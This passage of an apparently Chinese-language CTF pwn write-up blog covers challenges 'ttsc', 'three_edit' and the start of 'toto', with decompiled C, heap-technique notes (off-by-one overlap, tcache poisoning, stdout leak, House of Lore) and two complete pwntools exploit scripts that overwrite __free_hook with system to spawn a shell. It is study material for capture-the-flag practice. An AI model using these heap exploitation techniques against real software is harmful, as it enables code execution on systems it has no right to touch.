class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">10LL</span>;<br>  v4 = <span class="hljs-number">20LL</span>;<br>  v5 = <span class="hljs-number">30LL</span>;<br>  v6 = <span class="hljs-number">40LL</span>;<br>  v7 = <span class="hljs-number">10LL</span>;<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v9 = <span class="hljs-number">0LL</span>;<br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what is your name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;age?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">15</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;too young&quot;</span>);<br>  LODWORD(v8) = v1;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;high?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">256</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Is too high&quot;</span>);<br>  HIDWORD(v8) = v2;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to my world.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name: %sage: %d\nhigh: %d\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8, HIDWORD(v8));<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p><strong>漏洞点：off-by-one</strong></p><ol><li>利用FMT函数，利用scanf输入’-‘不改变泄露libc</li><li>add的chunk大小为(0, 0x78]</li><li>利用edit的offbyone进行攻击，可以overlapping</li></ol><p><strong>堆重叠是真好玩</strong></p><p>如果不需要通过unsorted bin泄露libc，tcache泄露heap，通过堆重叠，三个堆块就可以实现tcache poinsion</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./ttsc&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;chs:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size,con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br>sleep(<span class="hljs-number">0.1</span>)<br>s(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>sl(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">name, age, high</span>):<br>ru(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>sl(name)<br>ru(<span class="hljs-string">&#x27;age?&#x27;</span>)<br>sl(age)<br>ru(<span class="hljs-string">&#x27;high?&#x27;</span>)<br>sl(high)<br><span class="hljs-comment">#------------------------ libc ----------------------------</span><br>start(<span class="hljs-string">b&#x27;Csc8&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;age: &#x27;</span>)<br>libc_low = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>))<br>ru(<span class="hljs-string">&#x27;high: &#x27;</span>)<br>libc_high = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>))<br>libc_base= libc_high*<span class="hljs-number">0x100000000</span>+ libc_low- libc.sym[<span class="hljs-string">&quot;_IO_file_jumps&quot;</span>]<br><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------ overlapping ----------------------------</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span>+p8(<span class="hljs-number">0x61</span>))<br><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">&quot;aaaaa&quot;</span>)<br>free(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x31</span>)+p64(free_hook-<span class="hljs-number">8</span>) )<br><br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(system))<br><br>free(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment">#debug()</span><br>pi()<br></code></pre></td></tr></table></figure><h2 id="3-three-edit"><a href="#3-three-edit" class="headerlink" title="3. three_edit"></a>3. three_edit</h2><h3 id="层次"><a href="#层次" class="headerlink" title="层次"></a>层次</h3><p><strong>tcache bin  (0x20  – 0x410)</strong></p><p><strong>fastbin (0x10 – 0x70)</strong></p><p><strong>unsorted bin (0x70+)</strong></p><p><strong>small bin（&lt;0x400）  | large bin（&gt;&#x3D;0x400）</strong></p><p>free的堆块先进tcache bin ，当tcache bin链子填满七块后</p><p>先判断能否进fastbin，如果不行，放进unsorted bin</p><p>之后申请chunk</p><p>如果unsorted bin大小不能满足，就根据unsorted bin的大小，放入small bin或者large bin</p><h3 id="Scanf特性-1"><a href="#Scanf特性-1" class="headerlink" title="Scanf特性"></a>Scanf特性</h3><p>scanf存在分配大内存的特性</p><p><strong>scanf可以合并掉fastbin中的chunk获取unsorted bin或者small bin</strong></p><p>有点牛的操作：存在fastbin，通过scanf一个很大的内容进缓冲区，从而使两个连在一起的fastbin合并成small bin</p><p><strong>学习：</strong>仅offbynull攻击-<a href="https://www.mrskye.cn/archives/3cd31180/">https://www.mrskye.cn/archives/3cd31180/</a></p><p>提到了scanf分配大内存的问题</p><h3 id="Tcache-Bins结构体"><a href="#Tcache-Bins结构体" class="headerlink" title="Tcache Bins结构体"></a>Tcache Bins结构体</h3><p><strong>tcache_perthread_struct</strong></p><p>其上会记录tcache bins的地址，如果能够修改该结构体上记录的某个tcache bin，可以直接修改对应tcache bin的内容</p><p>如果借助结构体，修改tcache bin的fd指针，从而改变指向</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><strong>main</strong></p><p><strong>init_0中申请了两个堆块,一个记录堆块地址，一个记录堆块的大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init_0();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      menu(a1, a2);<br>      a2 = (<span class="hljs-type">char</span> **)&amp;v3;<br>      a1 = <span class="hljs-string">&quot;%d&quot;</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      Edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      &#123;<br>        Add();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>      &#123;<br>        free_0();<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>menu</strong></p><p><strong>init_0：</strong>存放了两个堆块，一个记录heap地址，一个记录对应heap的大小</p><p><strong>add：</strong>index，size，content。下标&lt;&#x3D;14，size[0x50，0x70]</p><p><strong>free：</strong>index，没有UAF</p><p><strong>edit：</strong>index，conten，限制次数为三次，且修改内容大小固定为0x50</p><p><strong>需要注意的是，堆块的size和下标，都由初始init_0函数中申请的两个堆块 记录的值 决定</strong></p><p><strong>下标为负数时，可以修改tcache bin结构体</strong></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>在edit函数里，存在<strong>负向的越界写</strong>，基点是第一个初始chunk</p><p>其负向是<strong>tcachebin结构体</strong>，借助其实现覆写，泄露和攻击（使用三条tcache bin链子）</p><p>没有show函数，需要通过<code>_IO_2_1_stdout_</code>进行泄露libc和heap_base</p><ol><li>获得三条tcache bin链子(0x70,0x60,0x50)和两个fastbin</li><li>利用scanf特性，将fastbin合并为small bin，其上残留libc</li><li>反向写可以更改<strong>tcache结构体</strong>，从而修改对应tcache链的内容</li><li>利用tcache3链子，指向small bin上方，从而覆写small_bin_fd为<code>_IO_2_1_stdout</code></li><li>利用tcache1链子，指向small_bin_fd，实现<code>tcache bin -&gt; small bin -&gt; IO</code> </li><li>malloc出来，修改IO，从而泄露libc</li><li>利用tcache2， 改free_hook-0x8为’&#x2F;bin&#x2F;sh’，free_hook为system</li><li>get shell</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./pwn4&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ menu  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;is:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size,con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br>ru(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>sl(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>sl(con)<br><br><span class="hljs-comment">#------------------------ leak_libc  ----------------------------</span><br><span class="hljs-comment">#tcache bin 1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>): <span class="hljs-comment">#0-8</span><br>add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment">#6-0</span><br>free(i)<br><br><span class="hljs-comment">#tcache bin 2 </span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#tcache bin 3</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#fast bin to small bin</span><br>sla(<span class="hljs-string">&#x27;is:&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#set small bin --&gt; _IO_2_1_stdout (IO-0x33: size = 0x7f)</span><br>tcache3 = -<span class="hljs-number">62</span><br>edit(tcache3, p16(<span class="hljs-number">0xb380</span>))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x81</span>) +  p16(<span class="hljs-number">0x26a0</span>)) <br><br><span class="hljs-comment">#set tcache bin3 --&gt; small bin --&gt; _IO_2_1_stdout</span><br>tcache1 = tcache3 + <span class="hljs-number">2</span><br>edit(tcache1, p16(<span class="hljs-number">0xb3a0</span>))<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>,   p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br><br>libc_base = uu64() - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ Tcache poinsion  ----------------------------</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] <br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br><br>tcache2 = tcache3 + <span class="hljs-number">1</span><br>edit(tcache2, p64(free_hook-<span class="hljs-number">0x8</span>))<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>,)<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span> + p64(system))<br><br>free(<span class="hljs-number">6</span>)<br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="4-toto"><a href="#4-toto" class="headerlink" title="4. toto"></a>4. toto</h2><p><strong>笔者的libc版本是Ubuntu GLIBC 2.31-0ubuntu9.7，最后setcontext处与远端有差异</strong></p><p><strong>远端是Ubuntu GLIBC 2.31-0ubuntu9.2，第二种打法使用的是远端版本</strong></p><p><strong>house of lore作为tcache_stashing_unlink手法的前置思想</strong></p><h3 id="前置：House-of-Lore"><a href="#前置：House-of-Lore" class="headerlink" title="前置：House of Lore"></a>前置：House of Lore</h3><p><strong>学习</strong>：<a href="https://www.anquanke.com/post/id/198173#h3-3">https://www.anquanke.com/post/id/198173#h3-3</a></p><p><strong>前提：能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</strong></p><p><strong>目标：从而实现分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）</strong></p><p>how2heap- poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc 